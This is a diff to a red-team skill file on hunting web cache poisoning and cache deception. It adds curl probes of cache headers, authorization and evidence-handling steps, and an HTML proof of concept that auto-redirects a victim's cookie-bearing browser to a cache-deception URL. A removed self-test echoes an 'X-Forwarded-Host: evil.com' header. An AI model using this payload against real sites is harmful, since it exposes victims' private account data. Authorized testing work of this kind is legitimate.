@@ -4,9 +4,34 @@ description: Hunting skill for cache poison vulnerabilities. Built from 10 publi
 version: 1.1.0
 revision_date: 2026-07-25
 license: MIT
-category: redteam
-tags: [cache, poisoning, hunt, redteam]
+platforms: [linux]
+metadata:
+  tags: [cache, poisoning, hunt, redteam]
+  category: redteam
 ---
+
+## When to Use
+
+- Hunting cache poisoning, Web Cache Deception, CDN-fronted apps.
+
+## Prerequisites
+
+- Explicit authorization, target boundaries, and rate limits for the target.
+- Tooling: `curl`.
+- A writable evidence directory: `export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`.
+- For any state-changing step (writes, uploads, credential attempts), obtain explicit confirmation immediately before the command.
+
+## How to Run
+
+```bash
+# Send twice, compare Age header
+curl --max-time 30 --connect-timeout 10 -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
+curl --max-time 30 --connect-timeout 10 -s -I "https://target.com/page" | grep -i "age\|x-cache\|cf-cache"
+```
+
+## Procedure
+
+The phases below are the procedure. Keep each probe bounded (`--max-time`), record evidence beneath `OUTPUT_DIR`, and stop at the stop-conditions listed in Pitfalls.
 
 ## Crown Jewel Targets
 
@@ -223,6 +248,32 @@ True-Client-IP
 
 ---
 
+## SameSite Lax Bypass + WCD Combo
+
+```bash
+# If the target uses SameSite=Lax cookies, WCD alone won't work because
+# cookies aren't sent on cross-site requests. But SameSite=Lax sends
+# cookies on TOP-LEVEL NAVIGATION (meta refresh, anchor click, form GET).
+
+# Combo payload:
+cat > wcd_samesite_poc.html << 'HTMLEOF'
+<html>
+<head>
+  <!-- Victim visits this page, auto-redirects to WCD URL with cookies -->
+  <meta http-equiv="refresh" content="0; url=https://TARGET/profile.php/.css">
+</head>
+<body>
+  <p>Redirecting...</p>
+  <!-- Backup: anchor tag if meta refresh fails -->
+  <a id="fallback" href="https://TARGET/profile.php/.css">Click here</a>
+  <script>document.getElementById('fallback').click();</script>
+</body>
+</html>
+HTMLEOF
+
+echo "[+] WCD + SameSite bypass PoC saved to wcd_samesite_poc.html"
+```
+
 ## Gate 0 Validation
 
 1. **What can the attacker DO right now?**
@@ -297,30 +348,6 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 
 ---
 
-## Verification
-
-Run this self-test to confirm cache poisoning readiness:
-
-1. **Cache header detection** — confirm cache header recognition:
-   ```bash
-   echo "X-Cache: hit" | grep -q "X-Cache" && echo "PASS: cache header recognized" || echo "FAIL"
-   echo "CF-Cache-Status: HIT" | grep -q "CF-Cache" && echo "PASS: Cloudflare cache recognized" || echo "FAIL"
-   ```
-
-2. **Unkeyed header injection** — verify header probe syntax:
-   ```bash
-   echo "X-Forwarded-Host: evil.com" | grep -q "X-Forwarded-Host" && echo "PASS: unkeyed header syntax" || echo "FAIL"
-   ```
-
-3. **Fat GET test** — confirm GET-with-body support:
-   ```bash
-   curl --max-time 30 --connect-timeout 10 -s -X GET "https://httpbin.org/get" -d "test=body" 2>/dev/null | grep -q "test" && echo "PASS: GET with body supported" || echo "(httpbin may be down)"
-   ```
-
-All 3 tests verify cache poisoning probing readiness.
-
----
-
 ## Pitfalls
 
 - **Unkeyed header reflection without cache hit** — the header must be reflected AND the response must be cached (X-Cache: hit). Reflection alone without cache hit is not cache poisoning.
@@ -330,6 +357,13 @@ All 3 tests verify cache poisoning probing readiness.
 - **Host header poisoning without shared cache** — if the cache is per-origin (not shared), poisoning only affects your own requests. Test from a different IP/browser.
 - **Web cache deception vs poisoning** — deception tricks the cache into storing sensitive data as static content. Poisoning injects malicious content. Don't confuse the two.
 
+---
+
+## Verification
+
+- Every promoted finding states the expected behavior, the observed response, and the negative control that rules out a false positive.
+- Impact is demonstrated with the minimum state change necessary; a status code, banner, or scanner label alone is not a finding.
+- Requests, responses, UTC timestamps, and tool versions are recorded beneath `${OUTPUT_DIR:-./output}` so a reviewer can reproduce the claim.
 
 ---
 
